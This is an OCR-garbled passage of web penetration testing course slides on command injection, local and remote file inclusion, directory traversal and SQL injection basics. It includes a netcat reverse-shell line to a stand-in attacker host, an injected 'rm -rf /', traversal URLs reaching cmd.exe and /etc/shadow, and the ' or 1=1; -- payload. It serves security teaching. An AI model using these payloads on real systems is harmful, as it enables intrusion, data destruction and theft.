• Day 6: Capture the Flag 
INJECTION 
Gathering and Session Fixation 
,,,.,.,,.,.,,:.,.; Authentication Bypass 
S. Vulnerable Web Apps: Mutillidae 
6. Command Injection 
"t 7. Exercise: Command Injection 
8. File .Inclusion and Directory Traversal 
9. Exercise: local!Remote File Inclusion 
I. 0. SQL Injection Primer 
I L Discovering SQLi 
12. Exercise: Error~Based SQLi 
13. Exploiting SQLi 
14. SQLi Too1s 
I S. Exercise: sqlmap + ZAP 
16.Summary 
SEC542 I Web App Penetration Testing and Ethical Hacking 
36 
'---' 
'-..,I 
..____,, 
'-' 
..____,, 
..____,, 
'-' 
..____,, 
.'----' 
..____,, 
'----' 
'----' 
..____,, 
'-' 
'-' 
'-' 
Course Roadmap 
..____,, 
We will next discuss command injection. 
'---' 
'-..,I 
'---" 
'---" 
..____,, 
..____,, 
..____,, 
..____,, 
.'--"' 
..____,, 
'-..,I 
'---" 
\._./ 
'-..,I 
'-' 
.'----' 
'-..,I 
\._./ 
\._./ 
36 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'-..., 
OTG-INPVAL-013: Testing for Command Injection 
"OS command injection isa technique used via a 
web interface in order to execute OS commands on 
a web server. The user supplies operating system 
commands through a web interface in order to 
execute OS commands.": 
The purpose of OTG-INPV AL-013 is to assess the application for OS Command Injection flaws. These flaws 
when exploited allow the penetration tester to have underlying OS commands execute based on the provided 
input. 
Reference: 
[I] https://www.owasp.org/index.php/Testing_for _Command_ Injection _(OTG-INPV AL-013) 
(https://cyber.gd/542 _ 154) QR 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
37 
-..._,; 
-..._,; 
Command·•lnjection 
• Command injection enables us to input operating system 
commands through the web application 
• Commands sent in are geared to two types of results: 
o Local Results 
o Remote Results 
• Pick commands based on server OS determined during mapping 
• Command injection provides control of the server to the attacker: 
o Running within the privileges of the web application 
'---' 
'--' 
'----' 
'--' 
'-../ 
-..._,; 
'---' 
'-' 
'---' 
'-' 
'-' 
'-' 
'---' 
Many applications used to be written in UNIX shell scripts, such as BASH and PERL, and the variable 
separation was rather crude. Even worse, often these scripts incorporated calls to external applications. Such a 
call often looked like this: 
system("externaltool ".variable); 
Where the variable was input from the web application. If the input included a";" (semicolon), additional 
commands could be executed. 
For example, imagine a script that calls an external program to authenticate the user. An attacker types the 
following text in the username field in the web interface: "ura" 
And then types the following text into the password field: "IOOser; rm -rf /" 
This translates to the following: system('authenticate ura:lOOser; rm -rf /') 
If the script is running with root privileges, then the attacker has deleted the contents of the root partition. 
How about a password of"; /usr/bin/nc -e /bin/sh hackerdomain.com 31337"? 
38 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'---' 
'-../ 
'-' 
'-../ 
'-../ 
'---' 
'-..J 
'---' 
'---' 
'---' 
'-' 
'---' 
'-' 
'-../ 
'-' 
'-../ 
'-' 
'---' 
'-../ 
'--' 
........, 
'--" 
'---' 
'-../ 
'-../ 
Discovering Command Injection 
• Command injection involves attacker-controlled input being used 
in OS commands 
• Focus particularly on resources that appear to be used on the 
system 
• Example: 
o New accounts require a directory to store configs 
o Application accepts a username parameter 
o It then runs mkdir username 
• These characters are your prefix friends: 
& , 
&& , 
I I , <, >, ; , 
I 
Discovering command injection is as simple as any other injection. We look at each parameter and determine if 
it is used as part of an operating system command. We then fuzz it to see what happens. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
39 
'--' 
'-../ 
Command. Injection Results 
• The injection causes one of 
two types of results 
• We want to select our 
commands based on which of 
the two is returned 
• Visible Results: 
o Use when results are returned to 
'the browser 
o Directory Listing: 
• ; ls /etc 
o ; ends previous command 
o ls / etc lists the files in the etc directory 
• Blind Results: 
o Use when results aren't displayed 
in the browser 
o Ping yourself! 
• ; ping y.o.ur.ip 
o Run a sniffer on your network 
o Look for ICMP echo requests from the target 
'--' 
'-../ 
'---" 
\..../ 
'--' 
'-../ 
'-../ 
'-../ 
'-../ 
'-./ 
'-../ 
'-../ 
'-../ 
'--' 
If the application runs the command and then either displays the command or creates content based on the 
results, these types of commands are useful. This is less common than the next option. Some common 
commands to run are 
• 
ls 
• 
netstat -an 
• 
adduser 
If the application doesn't display the results, either in whole or by building content from the results, then the 
attacker must use commands that generate traffic across the network. A typical way to do this would be to ping 
an address that is under the attacker's control. The attacker then needs to run only a sniffer and detect the ICMP 
echo requests. Another means would be to run a command that would result in the machine requesting a page 
from a web server the attacker controls. Monitoring the web server logs would let the attacker see the traffic. If 
the attacker would like to send data from the server, he or she needs to make the data only part of the URI 
request. Again, reading the web server logs would provide the information to the attacker. 
40 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-../ 
'--' 
'-./ 
'--' 
'--' 
'--' 
'---" 
'--' 
'--' 
'-../ 
'--' 
'-../ 
'-../ 
'-../ 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
'---" 
'---" 
'-.J 
\._.; 
'--' 
'--' 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
INJECTION 
I. Session Tracking 
l. Session 
Gathering and ::oioP,,,m,,n Fixation 
3. Bypass 
4. Exercise; Authentication Bypass 
5. Vulnerable Web Apps: Mutillidae 
6. Command Injection 
7. Exercise:,. Command Injection 
8. File Inclusion and Directory Traversal 
9. Exercise: local/Remote File Inclusion 
I 0. SQL Injection Primer 
i ! . Discovering SQLi 
12. Exercise: Error-Based SQli 
13. Exploiting SQLi 
i 4. SQU Tools 
15. Exercise: sqlmap + ZAP 
16. Summary 
SEC542 I Web App Penetration Testing and Ethical Hacking 
41 
Course Roadmap 
Let's perform command injection hands-on. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
41 
SEC542 Workbook: Command Injection 
Exercise 3.2: Command Injection 
SEC542 I Web App Penetration Testing and Ethical Hacking 
42 
\,_.,
\,_., 
'-'
'-.../ 
'-../
'-.../ 
'-.../
'-.../ 
'-' 
'-.../ 
'-.../ 
'-.../ 
'-../ 
'-../ 
'-' 
'-" 
._, 
SEC542 Workbook: Command Injection 
'-.../ 
'-" 
Please go to Exercise 3.2 in the 542 Workbook. 
'-../ 
'-' 
'-../ 
'-.../ 
'-' 
'-./ 
'-' 
'-../ 
'-.../ 
'-----' 
'-' 
'-./ 
'-./ 
'-" 
'----' 
'-./ 
'-' 
'-./ 
42 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
._, 
\.__, 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
INJECTION 
I • Session Tracking 
2. Session Token Gathering and Session fixation 
3. 5vciass 
4. Exercise: Authentication Bypass 
5. Vulnerable Web Apps: MutiUidae 
6. Command Injection 
7. Exercise: Command Injection 
8. File Inclusion and Directory Traversal 
9. Exercise: local/Remote File Inclusion 
I 0. SQl Injection Primer 
I I. Discovering sou 
I 2. Exercise: Error-Based SQU 
13. Exploiting sou 
14. SQLi T ooh, 
IS. Exercise: sqlrnap + ZAP 
16.Summary 
Course Roadmap 
The next section describes directory traversal, as well as local and remote command injection. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
43 
'-- 
'-- 
OTG-INPVAL-012:Testing for. Code Injection: LFI/RFI 
"The File Inclusion vulnerability allows an attacker 
to include a file, usually exploiting a "dynamic file 
inclusion" mechanisms implemented in the target 
application. The vulnerability occurs due to the use 
of user-supplied input without proper validation."! 
SEC542 J Web App Penetration Testing and Ethical Hacl<jng 
« 
'-- 
'-'
'-'
'-'
'-'
'----
'--- 
'-'
'-'
'-'
'-'
'----' 
'-'
'-'
'-'
'-.../ 
'----' 
The OTG-INPVAL-012 Test ID includes coverage for both Remote File Inclusion and Local File Inclusion. 
Reference: 
[I] https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion (https://cyber.gd/542_326) QR 
'----'
'-'
'-'
'-' 
'-'
'-'
'-' 
'-' 
'-' 
'-' 
'--- 
'--- 
'--- 
'--- 
'-- 
44 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'-- 
'-- 
\..., 
'--' 
'- 
Local and Remote File Include 
File inclusion flaws can retrieve files locally (LFI) or remotely (RFI) 
• From the perspective of the application 
Local file inclusion allows for the attacker to read files from the 
server 
• This would be information disclosure 
Remote file inclusion allows the attacker to retrieve files from a 
remote server 
• Contents of the file would be used by the application 
• This opens a potential for code execution 
45 
File inclusion flaws can retrieve files locally or remotely. This is from the perspective of the application, so local 
files are ones that reside on the server the application is running on. Remote files would be from a different 
server. Keep in mind that egress filtering may block the application from loading files from external remote 
servers, but this would still allow for servers within the network to be accessed. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
45 
'--" 
'--" 
Directory traversal is a vulnerability that provides the ability to 
leave the web root 
• The web server is supposed to enforce restrictions on where files can be 
loaded from 
We can then load or run files from "protected" areas 
• C: \ Windows or / etc as two examples 
• This is file inclusion 
Older vulnerability but modern applications are giving us fun new 
ways to play 
'--" 
..__, 
..__, 
..__, 
..__, 
'-' 
..__, 
..__, 
..__, 
'-..../ 
..__, 
'-..../ 
..__, 
..__, 
Directory traversal and file include are when we trick the web application into letting us either read or execute 
files that are not in the WEBROOT directory structure. Of course, file include can be used to read files within 
the WEBROOT. 
The precise methodology depends on the nature of vulnerability that we are leveraging. Sometimes, the 
vulnerability will allow us to simply input" ../../ . ./ . ./ . ./etc/shadow" or whatever. Other vulnerabilities require us 
to modify the encoding, changing it to Unicode, for example. 
IIS was vulnerable to directory traversal several years ago ... several times! The first vulnerability was solved by 
a patch that tracked"/" characters. This was easily defeated by encoding the"/" as Unicode because Unicode 
decoding was performed after the directory constraints were enforced. 
46 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-.__,/ 
..__, 
..__, 
'-..../
..__, . 
..__, 
'--" 
..__, 
..__, 
'-..../ 
..__, 
'-..../ 
'-' 
'-'
'-' 
..__, 
..__, 
..__, 
'-'
..__, 
'--./ 
'-' 
'-' 
'-' 
..__,
'-' 
Traditional Example 
• The traditional example leaves the web root 
• It allows access to files on the system including the ability to execute 
programs: 
http://vulnsite/scripts/ .. / .. / .. /windows/system32/cmd.exe+/c+dir 
• This example runs cmd.exe and retrieves a directory listing: 
o Starting the URL in the scripts directory is required due to the default restriction that 
executable code must run from the scripts directory 
• May use encoding to bypass controls 
• Patches are available for all the servers that are known to be vulnerable to 
this attack 
o Recommendations in our report should discuss the patch and ensuring patches are 
applied 
S.EC542 I WehApp PenetratiortTesting 
The traditional example is a flaw from IIS. This flaw allowed an attacker to craft a URL that accessed the scripts 
directory but then went up the directory tree to finally access cmd.exe. The scripts directory was important 
because by default it was the only directory that programs were allowed to execute from. 
This is not an IIS problem. Many different servers and applications have been vulnerable and more are found 
quite often. Typically, this is a bug in the server implementation, but we will see next how applications can be 
vulnerable to this also. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
47 
'--' 
'--' 
Application Example 
• Many applications load files 
• Files such as templates, configs, and data 
• As testers, we need to focus on parameters used to load files 
• Let's look at an example: 
o Site loads configuration file from parameter: 
• http://vulnsite/index.php?templ= .. /include/siteconfig.inc 
o Application doesn't verify the format and the function to load the file 
doesn't filter: 
o http://vulnsite/index.php?templ=/etc/passwd 
SEC542 I Web App Penetration Testfng and Ethical Hacking 
43 
\._l
'-'
'-' 
'-' 
..__,, . 
'-' 
'-' 
'---' 
'-' 
'-' 
'---' 
'---' 
'---' 
'-' 
'---' 
..____,, 
Sometimes, a web application enables the browser to specify a configuration file and location on the server to be 
included with the master configuration for that session. 
Not all directory traversal vulnerabilities are immediately identifiable. Sometimes, a hidden field in a web form 
simply includes text, such as message-stuff. However, this may well be a filename. Try changing it to 
. ./message-stuff and see how the page changes. 
Remember, we're talking about exploiting code written by developers who most frequently think only about how 
an application is supposed to work and attempt to make it follow that mold. If all goes well, the application 
mostly behaves as anticipated. If we touch it, however, it cries. 
Any code that may access files in the server filesystem may be vulnerable. Ifwe have any control, we have to 
check! 
48 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'-' 
'-' 
'-' 
'--' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'---' 
'-' 
'-' 
'-' 
'-' 
'--J 
'-' 
'-' 
'-.,I 
'-' 
Testing for Directory Traversal and File Include Flaws 
• Examine the application for places that appear to include files 
• Parameters may be obvious: 
o config= .. / .. /includes/config.php 
• Or built from parameters: 
o config=site 
o The application then uses: 
.. / .. /includes/${config}.php to load the file 
SEC542 \Web App Penetration Testing and Ethical Hacking 
49 
To test for this flaw, simply look for parameters that appear to contain filenames and change them to point 
outside the web root. Also look for parameters that are the basis for a filename such as the example of 
templ=red, which the application expands to ../../template/red.php. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
49 
\J 
Obvious .. Parameters 
• If we find obvious parameters, we should enter paths based on OS detected 
during mapping: 
o /etc/passwd 
• Contains usernames on a UNIX system 
o /global.asax 
• Application configuration on IIS 
o \docume-1 \fprefect\mydocu-1 
• User directory on Windows in 8.3 notation 
o \ windows \system32 \ cmd.exe 
• Used to execute commands on Windows 
• Look at the results 
• Remember results may be in the source 
\J 
\J 
'--' 
'--' 
'--' 
'-..,, 
'-..-, • 
'-..,, 
\J 
'-....,/
\J
\J
'-....,/ 
\J 
'-..,, 
'-....,/
To conduct directory traversal attacks, you need to understand where the default locations for various files are 
located. For example, Debian-based Linux systems with Apache often use /var/www/ or /var/www/html as the 
web root. Users have their own web roots in /home/username/public_html/. The directory /usr/lib/cgi-bin is a 
common location for CG! scripts. Other applications may have their own, well-known web root and scripts 
directory. The most important thing to understand is where the "current working directory" is when the 
script/application executes. That is where to begin thinking when you type your first" . ./". 
50 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-....,
'-..,, 
'-..,,
\J 
'-...,·
\J 
'-..,,
\._,, 
'---' 
'- 
'---' 
'-..,,
'-..,,
'-'
'-'
'---"
'-'
'-..-, 
'- 
'-..-, 
"--
'-..-,
'-..-, 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
· Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
INJECTION 
L Session Tracking 
2. Session Token Gathering 
3. Bypass flaws 
4. Exercise; Authentication Bypass 
S. Vulnerable Web Apps: Mutiflidae 
6. Commllnd Injection 
7. Exen::ise: Command Injection 
8. File Inclusion and Directory Traversal 
9. Exercise: Local/Remote File Inclusion 
0. SQL Injection Primer 
I I. Discovering SQU 
12. Exercise: Error-Based SQLi 
13. Exploiting sou 
14. SQli T ools 
Session 
I 5. Exercise: sqlmap + ZAP 
16. Summary 
Course Roadmap 
Next up: Local file inclusion and remote file inclusion, hands-on. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
51 
'--' 
SEC542 Workbook: Local/Remote File Inclusion 
·~ 
Exercise 3.3: Local/Remote File 
Inclusion 
SEC54] I Web App Penetration Testing and Ethical Hacking 
sz 
'--'
'-...,
'-'
.__..,,
'-...,
.__..,,
'-"
'-..,/
'-'
'-..,/ 
'-..,/
...__.,,
'-..,/
'-../ 
'-..,/ 
'-../
SEC542 Workbook: Local/Remote File Inclusion 
'-..., 
'-..,/ 
Please go to Exercise 3.3 in the 542 Workbook. 
'-'
'-../ 
'-..., 
'----' 
'---'
'-..., 
'-' 
'-..., 
'----' 
'---' 
'-..., 
'---' 
'-..., 
'---' 
'-' 
'---' 
'--- 
'--- 
'-' 
52 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'--' 
'--' 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
INJECTION 
I. Session Tracking 
2. Session Token Gathering and Session Fixation 
3. Bypass Flaws 
4. F,r,~~r,~"''- A~1th,ent;ica,tic1n R,vn2~~ 
5. Vulnerable Web Apps: Mutiltidae 
6. Command Injection 
7. Exercise: Cotnmand Injection 
8. File Inclusion and Directory Traversa! 
9. Exercise: Local/Remote File lndusion 
I 0. SQL Injection Primer 
I I. Discovering SQU 
12. Exercise: Error~Based SQLi 
I 3. Exploiting SQLi 
l 4. SQLi T ooh, 
l S. Exercise: sqlmap + ZAP 
16.Summary 
Course Roadmap 
We will spend a large portion of 542.3 discussing one of the most critical web application flaws: SQL injection 
(aka SQLi). We will begin with a primer on SQLi. 
' 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
53 
'---' 
"--' 
Introduction to SQL Injection 
• SQL injection is perhaps the most well known of all web 
application flaws 
o Even those with limited application security exposure are aware of SQL 
injection 
• Also, one of the easier to address from an application security 
perspective 
• Despite the above, SQL injection remains a significant and 
commonly encountered application flaw 
SEC542 I Web App Penetration Testing and .. Ethical Hacking 
54 
'---' 
'---'
'-.../ 
'---' 
'---'
....__,, 
.-._/
'---' 
'--" 
'---' 
'---'
'-.../ 
'---' 
'--"
'---' 
'---' 
Long one of the hallmarks of web application security, SQL injection (SQLi) is very likely the most well known 
of all the flaws we touch on during this class. Most security professionals have some familiarity with SQ Li 
flaws. Even many less technical resources have a sense for SQL injection flaws. 
Despite its popularity throughout the ages, SQLi continues to crop up in many applications both new and old. 
54 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'---' 
'---' 
'----' 
'----' 
'---' 
'---' 
'--' 
'---' 
'-' 
'-' 
'--- 
'--- 
'- 
'- 
\__, 
'- 
'- 
'- 
'-- 
\__, 
\__, 
'-- 
Origin of SQL Injection 
• Applications routinely employ relational (SQL) data stores for a 
variety of reasons 
• The application will interface with these data stores to add, 
update, or render data 
o Often how this proceeds depends upon user interaction 
• None of this presumes a SQL injection flaw ... 
• The flaw originates from the application allowing user-supplied 
input to be dynamically employed in a generated SQ L statement 
The most common backend data store has long been the SQL-based relational database. Applications routinely 
employ relational (SQL) data stores for a variety ofreasons. The web application interfaces with the data stores 
most commonly to retrieve and render data. However, these tools are also routinely used to add new or update 
existing data. 
Quite often, how the database interaction occurs is influenced by the user of the application. This is to be 
expected and does not imply a SQL injection flaw. The flaw stems from the application allowing user-supplied 
input to be used in a dynamically built SQL query that is sent to the backend data store. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
55 
'-" 
\J 
Relational •Databases 
• Most of what we discuss will generally apply to all of the various 
Relational Database Management Systems (RDBMS) 
• However, the particular RDBMS on the other end of the 
application does matter 
o Especially relevant when considering exploitation techniques and post- 
exploitation capabilities 
• The course will not dig too much into the specifics of targeting a 
particular RDBMS 
oAlso, will not omit key SQLi aspects just because they are not applicable to 
all RDBMSs 
\J 
\..J 
'-..../ 
'-..../ 
\..J 
\..J 
'-" 
'-..../ 
\..J 
'-..../ 
\..J 
'-..../ 
'-..../ 
'-..../ 
We hear quite a bit about data stores other than relational databases, so much so that you might get the 
impression that relational databases are legacy or in a state of active decline. You could not be blamed for 
thinking that, but you would be wrong. 
Relational databases and the ecosystem supporting them, the Relational Database Management Systems 
(RDBMS), are thriving. Although we talk about SQL injection in generic terms, in truth, there are numerous 
aspects ofSQLi that are dependent upon the particular RDBMS in question (for example, Oracle Database, 
MySQL, MS SQL Server). 
56 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-..., 
'-.../ 
'-..../ 
'-..../ 
''-../ 
'-..../ 
'-..../ 
'-..../ 
\..J 
'-..../ 
\..J 
'-..../ 
'-.../ 
'-..../ 
'-.../ 
\..J 
'-..,/ 
\..J 
'-..., 
'-..,/ 
'-..../ 
'-..,/ 
'-..,/ 
'-..., 
'-..../ 
'-..../ 
Key SQLVerbs 
• SELECT - Most common verb, retrieve data from a table 
• INSERT - Add data to a table 
• UPDATE - Modify existing data 
• DELETE - Delete data in a table 
• DROP - Delete a table 
• UNION - Combine data from multiple queries 
First things first, we need to get some exposure to SQL. We will not concentrate (certainly not yet) on the 
nuances that distinguish the different database vendors. The primary goal of the SQL primer is to ensure 
everyone has sufficient basic familiarity to be able to navigate the later information. 
The following verbs are the most commonly encountered, and are widely supported across the various 
RDBMSs: 
SELECT - Most common verb, retrieve data from a table 
INSERT - Add data to a table 
UPDATE - Modify existing data 
DELETE - Delete data in a table 
DROP - Delete a table 
UNION - Combine data from multiple queries 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
57 
'--' 
'-..,J 
SQLQuery\Modifiers 
• WHERE - Filter SQL query to apply only when a condition is 
satisfied 
• AND/ OR - Combine with WHERE to narrow 
the SQL query 
• LIMIT #1, #2 - Limit rows returned to #2 
many rows starting at #1 
0 LIMIT 2 OFFSET 1 yields the same 
• ORDER BY # - Sort by column # 
'-J 
'-./ 
'-./ 
'-./ 
'-./ 
'---' 
'-./ 
'---' 
'-./ 
'-.../ 
'-.../ . 
'-./ 
'-./ 
"-..., · 
Another quick exposure slide is a quick list of items that you will often see employed to modify how these SQL 
verbs or statements are carried out. These are common SQL query modifiers. 
WHERE - Filter SQL query to apply only when a condition is satisfied 
AND/OR - Combined with WHERE to narrow the SQL query 
LIMIT #1, #2 - Limit rows returned to #2 many rows starting at #1 
ORDER BY # - Sort by column # 
The WHERE clause is ubiquitous. In fact, the WHERE clause is the location that we are most likely to find out 
the point ofSQL injection because that is routinely where input is sought and provided. 
58 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-.../ 
'-./ 
'--' 
~ 
'-./
'-.../ 
'-.../ 
'-.../
'---' 
'---' 
'--' 
'-.../ 
\..._,· 
'-.../ 
'-./ 
'-./
'-.../ 
'-.../ 
'-.../ 
'-.../ 
'-.../ 
'-'
\.J
'-.../ 
'---' 
'-' 
Important SQl. DataTypes 
• bool - Boolean True/False 
• int - Integer 
• char - Fixed length string 
• varchar - Variable length string 
• binary - Name employed varies quite a bit 
Note: Names used for data types vary across the relational database 
providers 
Unlike the SQL verbs and modifiers discussed previously, there is a tremendous variance in what each RDBMS 
refers to these data types as. Regardless, they all have these types of data no matter what the name. The name 
that gives people the most trouble is varchar, which we can just think of as a simple string. String and numeric 
data will be the types that we encounter the most, and we will get a better sense of how these are handled as we 
progress through the content. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
59 
'--../ 
'-..../ 
SQI. Special Characters 
II 
, 
String delimiter 
Terminates an SQL statement 
# , I* 
Comment delimiters 
% , * 
Wildcard characters 
I 
I , +, 
+, <, 
== 
00 
JI 
II 
>, 
String concatenation characters 
Mathematical operators 
Test for equivalence 
Calling functions, subqueries, and INSERTs 
Null byte 
\....., 
\....., 
\.....,
\.....,
\....., 
\....., 
\....., 
\....., 
'---'
\....., 
\.....,
\.....,
\....., 
This is where things start to get interesting and extremely pertinent. The table is by no means intended to be an 
exhaustive list, but it can give you an idea of some of the characters and their use as you increase exposure to 
SQL. You can already see that some of the items like comment delimiters and string concatenation operators 
clearly have multiple options available. Some RDBMSs will have multiple special characters for the same thing, 
but in other instances, it serves as an indication that there is variability among the RDBMSs that we encounter. 
'---' 
'-J
\....., 
'--'
\....., 
'----" 
___,
\.....,
\....., 
'-' 
\.....,
\.....,
'-'
\.....,
'-'
'---' 
\....., 
'-' 
\.....,
\.....
'-'
'-'
'----"
'-'
60 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-.., '
'-' 
SQL Injection Example: Code 
Server-side PHP code taking the value of the URL query parameter 
name as input to SQL SELECT 
$sql = 
II 
SELECT* 
FROM Users 
WHERE lname=' $ 
GET ["name"] '; 
II 
Note: Code above is split across multiple lines for clarity 
Now, we walk through a very simple injection. 
First, let's see what the server-side code looks like that dynamically builds the SQL query. 
$sql = 
II 
SELECT* 
FROM Users 
WHERE lname= ' $_GET [ 
11 name" ] ' ; 
Highlights from the previous code are: 
SELECT - The query itself is a SELECT for retrieving data. 
* - Indicates that all columns will be returned. 
FROM Users - Identifies that Users table is the target. 
WHERE lname= - Filtering the data that will be returned with a WHERE clause on the !name column. 
' $_GET [ 
11 name 11] ' - Single quotes surround this whole piece because it expects a string to be 
supplied. The string is being populated with data being retrieved from the URL query parameter of 
name. 
; - The semicolon completes the statement. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
61 
..._,, 
SQL Injection• Example:•Normal Input/Query 
Normal Input: Dent 
URL: 
http://sec542.org/sqli.php?name=Dent 
SQLQuery: 
SELECT* 
FROM Users 
WHERE lnarne='Dent'; 
Expected Result: 
Normal result based on input of Dent 
..._,, 
'---' 
'---' 
..._,, 
'-----' 
..___,, 
'---' 
..._,, 
..._,, 
'-.../ 
'---' 
'-' 
'-.../ 
Given normal/expected input, what would the query be? Let's check it out. Here, we have a name of Dent being 
supplied in the URL query parameter of name. 
SELECT* 
FROM Users 
WHERE lname='Dent'; 
Everything looks standard. Normal results would be expected to follow. 
62 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-.../ 
'---' 
.__, 
'-.../ 
..._,, 
..___,, 
'---' 
'-.../ 
..._,, 
..___,, 
'-./ 
-...J 
'-' 
'-.../ 
.__, 
'-' 
..._,, 
'--' 
..._,, 
'---' 
'-.../ 
..._,, 
..._,, 
..._,, 
.__, 
\..__/ 
SQL Injection Example: Injected Input/Query 
Injected Input: Dent' 
URL:http://sec542.org/sqli.php?name=Dent' 
SQLQuery: 
SELECT* 
FROM Users 
WHERE lname='Dent' '; 
Expected Result: 
Stray ' causes a syntax error 
Does adding one little bitty single quote to the end change things for the query? 
SELECT* 
FROM Users 
WHERE lname='Dent' '; 
The addition of that one character causes the SQL statement to throw an error that could be displayed back to us. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
63 
'--' 
SQL Injection Example: Injected Input 2/Query 2 
Injected Input: Dent'; 
URL:http://sec542.org/sqli.php?name=Dent'; 
SQLQuery: 
SELECT* 
FROM Users 
WHERE lnarne='Dent'; 
Expected Result: 
Normal result based on input of Dent 
. , 
SECS42 I Web App Penetration Testing and Ethical Hacking 
64 
\.J 
\.J 
\.J 
\.J 
\.J 
"--' 
'-.../ 
'-.../ 
'-.../ 
'-../ 
\.J 
'-.../ 
\.J 
\.J 
\.J 
'-.../ 
The next input adds a ; -- to the previous Dent' 
'-.../ 
\.J 
SELECT* 
FROM Users 
WHERE lname='Dent'; 
\.J 
'-.../ 
I• 
' 
\.J 
This input supplies a legit name, closes out the string, terminates the statement, and finally, ends with a 
comment delimiter. 
64 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-../ 
'-../ 
'-.../ 
\.J 
'-.../ 
'-.../ 
\.J 
'-.../ 
'-.../ 
'-.../ 
'-.../ 
\.J 
'-.../ 
'-.../ 
\.J 
'-../ 
\.J 
'-.../ 
' or 1=1; -- 
• The payload ' or 1=1 ; - - , or a variation upon that theme is 
found in almost all SQLi documentation 
• To understand its popularity, let's break down the injection into 
three parts: 
' - The single quote closes out any string 
or 1=1 - This tautology changes the query logic 
; - - - The end of the payload completes the statement and 
comments out remaining code that could cause syntax errors 
SEC542 j Web App Penetration Testing and Ethical Hacking 
65 
Probably the single most well-known SQ Li payload out there,' or 1 = 1; -- , is all but ubiquitous. Why is this 
string so popular? Let's parse it and see what is going on. 
' - The single quote closes out any string. 
or 1=1 - This tautology changes the query logic. 
; -- -The end of the payload completes the statement and comments out remaining code that could 
cause syntax errors. 
Warning: Some RDBMSs require a space after the(--) comment delimiter. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
65 
'---' 
SQL Injection Example: ' or 1=1; -- Injected 
Injected Input: ' or 1=1 ; 
URL: 
http://sec542.org/sqli.php?narne=' or 1=1; -- 
SQLQuery: 
SELECT* 
FROM Users 
WHERE lname='' or 1=1; 
Expected Result: 
Return all rows from the Users table 
. , 
SEC542 I Web App Penetration Testing and Ethical Hacking 
66 
'----' 
'----' 
'----' 
'-" 
'-" 
'----' 
'----- 
'-../ 
'-" 
'----' 
'-../ 
'----- 
'----' 
'-../ 
'---' 
What does that popular payload look like when injected into our name parameter? 
SELECT* 
FROM Users 
WHERE lname='' or 1=1; -- '; 
Put simply, the injection closed out the string, added an OR TRUE clause, closed out the query, and ended the 
whole thing with a comment. 
66 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
, __ ,/ 
'-' 
'----' 
'-" 
'--.., - 
'----- 
'----' 
'----' 
'---' 
'----' 
'----' 
'-" 
'----- 
'----- 
'--' 
'----- 
'--' 
'--' 
'--' 
'-._..,' 
'---' 
'---' 
'-'' 
SQ Li Balancing Act 
• Discovering and exploiting input flaws involves finding 
appropriate prefixes, payloads, and suffixes to cause impact 
o SQLi is no different 
• A significant aspect of discovering SQ Li flaws is determining 
reusable pieces of our injection 
• The most obvious aspect of SQL that requires balancing is the 
quotes used with string data 
Discovering and exploiting input flaws must take into account existing code. SQL injection is no different. We 
have to ensure the code we inject can be interpreted properly to achieve the desired end. 
Although we first inject code with the intent of causing errors, ultimately, we will need to get on the other side 
of the errors. String quoting is the most obvious place where this balancing must take place. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
67 
'-' 
,._,, 
Quote Balancing 
• Strings are the most common data type our input will land within 
SELECT* FROM Users WHERE lname='Dent'; 
• Proper prefixes and suffixes to accommodate strings will be 
needed 
• Example with comments: Dent' . -- 
, 
SELECT ... WHERE lname='Dent' ;-- '; 
